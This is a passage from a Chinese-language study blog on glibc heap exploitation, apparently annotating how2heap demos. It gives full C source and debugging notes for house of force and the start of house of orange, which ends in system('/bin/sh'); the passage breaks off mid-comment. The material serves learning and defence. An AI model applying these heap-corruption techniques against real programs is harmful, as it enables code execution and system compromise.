alt="image-20210518133848039"></p><p>此时我们malloc一个超大的chunk，我们的victim就会被放入small bin中，这里其实就是发生了malloc_conslidate</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538728910/0" alt="image-20210518134030220"></p><p>现在我们修改victim的bk指针，使其指向栈上</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538742110/0" alt="image-20210518134521708"></p><p>现在我们再申请一个victim一样大小的chunk，因为small bin是FIFO，所以头会先取出</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539172103/0" alt="image-20210518153352548"></p><p>现在我们再申请一个chunk就能申请到栈上了</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539177625/0" alt="image-20210518153452322"></p><h2 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h2><p>程序首先在栈上定义了两个变量,stack_buffer_1[4],stack_buffer_2[3]</p><p>随后在栈上创建了一个fake chunk,将stack_buffer_1的fwd指针指向了victim_chunk</p><p>随后将stack_buffere_1的bk指针指向了stack_buffer_2,将stack_buffer_2的fwd指针指向了stack_buffer_1来绕过检查</p><p>之后为了将我们的victim放进我们的small bin中,申请一个超大的chunk</p><p>在victim被放进了small bin后,我们只需要覆盖victim的bk指针指向我们的stack_buffer_1即可</p><p>现在我们再分配一个大小为100的chunk,系统就会把victim返回给我们,但此时small bin中还有我们依旧伪造好的fake chunk</p><p>此时再分配就可以将我们的fake chunk拿出来了</p><p>条件：</p><ol><li>能够控制small bin中的bk指针</li></ol><p>感觉这种是不是换成unsorted bin是不是也行？我猜的</p><h1 id="0x13-house-of-force"><a href="#0x13-house-of-force" class="headerlink" title="0x13 house of force"></a>0x13 house of force</h1><p>利用一个巨大的size来改写top chunk的size</p><h2 id="源代码-13"><a href="#源代码-13" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bss_var是我们要覆写的string</span></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// House of Force是覆写top chunk来分配任意内存地址的攻击方法</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// top chunk是一个特殊的chunk,是内存中最后一块chunk,在向系统申请更多空间的情况下将会更改size的大小</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line"><span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//在最后,我们将会使用这个方法来覆写bss_var的值</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先分配一个chunk p1(256)</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在堆由两个chunk组成,一个是我们分配的,另一个就是top chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以覆盖top chunk的大小</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用一个超大的值来覆盖top chunk以让我们可以确保malloc永远不会调用mmap来申请空间</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们的top chunk的size巨大非凡,我们可以随意申请内存而不会调用mmap</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">   <span class="comment">// 下面,我们将通过整数溢出分配一个直达我们所需区域的,之后就可以在我们所需区域处分配一个chunk出来</span></span><br><span class="line">   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">我们所需的size是这么计算的:</span></span><br><span class="line"><span class="comment">     nb是我们要求的size+元数据</span></span><br><span class="line"><span class="comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">    <span class="comment">// 按预期,新的指针和旧的top chuk在同一位置</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="comment">// 现在,我们覆写的下一个chunk将指向我们的目标buffer</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line">    <span class="comment">// 现在,我们终于可以覆写这个值啦!</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"><span class="comment">// some further discussion:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-12"><a href="#运行结果及调试-12" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先申请了p1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539237307/0" alt="image-20210518154759704"></p><p>此时我们修改我们top chunk的size为-1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539243039/0" alt="image-20210518154926372"></p><p>此时因为top chunk的size巨大无比，所以无论我们申请多少的空间，他都不会再调用mmap了</p><p>现在我们计算evil_size的大小</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539373867/0" alt="image-20210518161628202"></p><p>然后我们申请一个evil_size大小的chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539394391/0" alt="image-20210518162025441"></p><p>现在我们新申请的chunk是从之前的top chunk起始的，此时我们再申请一个chunk就可以拿到我们想要申请的地址了</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539576432/0" alt="image-20210518165600310"></p><p>程序首先建立了一个全局变量bss_var,也就是我们需要攻击的地方</p><p>随后分配了chunk p1(256),现在我们的top chunk的size是一个比较小的值</p><p>因此我们假设有一个漏洞可以覆写top chunk的size,我们通过写入-1来使size变为一个巨大的数(0xffffffffffffffff)</p><p>此时无论我们再申请多大的空间,ptmalloc都不会再向系统申请调用mmap了(当然..如果把0xfffffffffffffff的空间都用完了还是会申请的</p><p>现在我们计算出了evil_size所需的值,也就是</p><p>evil_size=(bss_var-16)-(ptr_top)-16</p><p>此时我们先申请一个大小为evil_size的chunk,此时新指针和旧的top chunk在同一位置,而size正好是旧top chunk到我们bss_var的差值</p><p>此时我们再申请一块chunk就可以获得我们想控制的var_bss了。</p><h1 id="0x14-house-of-orange"><a href="#0x14-house-of-orange" class="headerlink" title="0x14 house of orange"></a>0x14 house of orange</h1><p>house of orange来自angelboy在hitcon 2016上出的一道题目,这个攻击方法并不单指本文所说的,而是指关于其一系列的伴生题目的漏洞利用技巧</p><p>其最主要的原理就是在没有free的情况下如何产生一个free状态的bins和io_file的利用</p><p>但最最最主要的利用是io_file的利用</p><h2 id="源代码-14"><a href="#源代码-14" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      // house of orange开始于一个在堆上有一个可以破坏top chunk的缓冲区溢出漏洞的假设</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      // 在执行前,整个heap都是top chunk的一部分</span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      // 通常来说,第一次申请内存的时候会从top chunk中切出一部分来处理请求</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      // 然后,随着我们不停的分配top chunk,top chunk会变得越来越小</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      // 而在我们所申请的size比top chunk更大时会有两件事情发生</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">      // 1.拓展top chunk,mmap一个新页</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在2.26的更改中,程序不在调用_IO_flush_all_lockp的malloc_printer的行为移除了我们攻击的媒介</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 由于对glibc 2.24 中 _IO_FILE vtable进行了白名单检查,因此这种攻击手段得到了抑制</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin 